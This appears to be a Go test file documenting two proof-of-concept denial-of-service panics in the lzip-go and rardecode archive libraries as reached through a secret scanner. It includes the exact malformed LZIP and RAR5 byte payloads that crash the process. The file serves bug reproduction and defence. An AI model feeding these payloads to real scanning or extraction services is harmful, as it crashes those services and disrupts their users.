package sources

import (
	"bytes"
	"context"
	"io"
	"testing"

	"github.com/mholt/archives"
)

// These tests document two zero-day, unrecovered-panic denial-of-service bugs
// reachable when betterleaks scans attacker-controlled content. Betterleaks
// identifies archives by file extension (sources/file.go: archives.Identify
// with a nil stream) and then hands the raw bytes to the matching
// decompressor/extractor. Neither betterleaks nor these upstream libraries
// recover(), so a panic anywhere on the scan path terminates the whole process
// (os exit 2). Each test asserts the panic reproduces so the PoC stays honest.

func expectPanic(t *testing.T, name string, fn func()) {
	t.Helper()
	defer func() {
		if p := recover(); p != nil {
			t.Logf("%s: reproduced panic: %v", name, p)
			return
		}
		t.Fatalf("%s: expected a panic but none occurred (bug may be patched)", name)
	}()
	fn()
}

// Finding #1: github.com/sorairolake/lzip-go@v0.3.8 reader.go:66 does
// copy(lzmaHeader[5:], rb[len(rb)-16:len(rb)-8]) with no length check. A .lz
// file whose post-header body is shorter than 16 bytes yields a negative slice
// bound. Reached via file extension ".lz" -> mholt/archives Lzip.OpenReader.
func TestLzipTinyFilePanics(t *testing.T) {
	// "LZIP" + version 0x01 + dict-size byte 0x17 (valid header, empty body).
	payload := []byte{'L', 'Z', 'I', 'P', 0x01, 0x17}
	expectPanic(t, "lzip", func() {
		rc, err := archives.Lzip{}.OpenReader(bytes.NewReader(payload))
		if err != nil {
			return
		}
		_, _ = io.Copy(io.Discard, rc)
	})
}

// Finding #2: github.com/nwaples/rardecode/v2@v2.2.2 archive50.go:499-503
// computes buf := make([]byte, 3+size-len(b)) from an attacker-controlled
// header-size varint, then does io.ReadFull(r, buf[3:]) with no check that the
// buffer is at least 3 bytes long. A tiny RAR5 file makes buf shorter than 3,
// so buf[3:] panics ("slice bounds out of range [3:1]"). Reached via file
// extension ".rar" -> mholt/archives Rar.Extract -> rardecode NewReader.
func TestRarTinyFilePanics(t *testing.T) {
	// RAR5 signature "Rar!\x1a\x07\x01\x00" followed by 8 zero bytes.
	payload := []byte{'R', 'a', 'r', '!', 0x1a, 0x07, 0x01, 0x00, 0, 0, 0, 0, 0, 0, 0, 0}
	expectPanic(t, "rar", func() {
		_ = archives.Rar{}.Extract(context.Background(), bytes.NewReader(payload),
			func(_ context.Context, _ archives.FileInfo) error { return nil })
	})
}
